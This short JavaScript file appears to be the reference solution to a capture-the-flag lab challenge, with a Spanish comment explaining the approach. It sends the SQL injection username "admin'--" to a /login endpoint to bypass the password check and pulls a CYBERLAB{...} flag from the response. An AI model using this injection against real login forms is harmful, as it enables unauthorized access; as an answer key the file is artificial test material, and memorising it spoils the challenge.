// Solución de referencia: cerrar la comilla del usuario y comentar el resto de la consulta.
export default async function solve({ request }) {
  const res = await request("/login", {
    method: "POST",
    headers: { "content-type": "application/x-www-form-urlencoded" },
    body: new URLSearchParams({ usuario: "admin'--", clave: "cualquiera" }).toString(),
  });
  return res.text.match(/CYBERLAB\{[^}]+\}/)?.[0] ?? null;
}
